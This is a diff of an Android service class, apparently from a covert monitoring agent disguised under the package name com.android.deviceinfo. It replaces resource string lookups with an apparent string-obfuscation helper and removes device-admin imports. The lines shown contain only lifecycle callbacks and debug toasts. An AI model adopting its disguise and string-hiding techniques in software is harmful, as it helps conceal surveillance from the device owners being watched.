@@ -1,21 +1,16 @@
 package com.android.deviceinfo;
 
-import java.io.IOException;
-
 import android.app.Notification;
 import android.app.PendingIntent;
 import android.app.Service;
-import android.app.admin.DevicePolicyManager;
-import android.content.ComponentName;
 import android.content.Intent;
 import android.content.res.Configuration;
 import android.os.IBinder;
 import android.widget.Toast;
 
 import com.android.deviceinfo.auto.Cfg;
-import com.android.deviceinfo.capabilities.PackageInfo;
-import com.android.deviceinfo.listener.AR;
 import com.android.deviceinfo.util.Check;
+import com.android.m.M;
 
 /**
  * The Class ServiceCore.
@@ -44,14 +39,14 @@ public class ServiceMain extends Service {
 			return;
 		}
 
-		Messages.init(getApplicationContext());
+		M.init(getApplicationContext());
 
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " (onCreate)"); //$NON-NLS-1$
 		}
 
 		if (Cfg.DEMO) {
-			Toast.makeText(this, Messages.getString("32_1"), Toast.LENGTH_LONG).show(); //$NON-NLS-1$
+			Toast.makeText(this, M.d("Agent Created"), Toast.LENGTH_LONG).show(); //$NON-NLS-1$
 		}
 
 		// TODO: verificare che needsNotification serva.
@@ -112,7 +107,7 @@ public class ServiceMain extends Service {
 		}
 
 		if (Cfg.DEMO) {
-			Toast.makeText(this, Messages.getString("36_3"), Toast.LENGTH_LONG).show(); //$NON-NLS-1$
+			Toast.makeText(this, M.d("(onConfigurationChanged)"), Toast.LENGTH_LONG).show(); //$NON-NLS-1$
 		}
 	}
 
@@ -125,7 +120,7 @@ public class ServiceMain extends Service {
 		}
 
 		if (Cfg.DEMO) {
-			Toast.makeText(this, Messages.getString("36_4"), Toast.LENGTH_LONG).show(); //$NON-NLS-1$
+			Toast.makeText(this, M.d("(onLowMemory)"), Toast.LENGTH_LONG).show(); //$NON-NLS-1$
 		}
 	}
 
@@ -138,7 +133,7 @@ public class ServiceMain extends Service {
 		}
 
 		if (Cfg.DEMO) {
-			Toast.makeText(this, Messages.getString("36_5"), Toast.LENGTH_LONG).show(); //$NON-NLS-1$
+			Toast.makeText(this, M.d("(onRebind)"), Toast.LENGTH_LONG).show(); //$NON-NLS-1$
 		}
 	}
 
@@ -151,7 +146,7 @@ public class ServiceMain extends Service {
 		}
 
 		if (Cfg.DEMO) {
-			Toast.makeText(this, Messages.getString("36_6"), Toast.LENGTH_LONG).show(); //$NON-NLS-1$
+			Toast.makeText(this, M.d("(onUnbind)"), Toast.LENGTH_LONG).show(); //$NON-NLS-1$
 		}
 
 		return ret;
@@ -166,7 +161,7 @@ public class ServiceMain extends Service {
 		}
 
 		if (Cfg.DEMO) {
-			Toast.makeText(this, Messages.getString("32_3"), Toast.LENGTH_LONG).show(); //$NON-NLS-1$
+			Toast.makeText(this, M.d("Agent Destroyed"), Toast.LENGTH_LONG).show(); //$NON-NLS-1$
 		}
 
 		core.Stop();
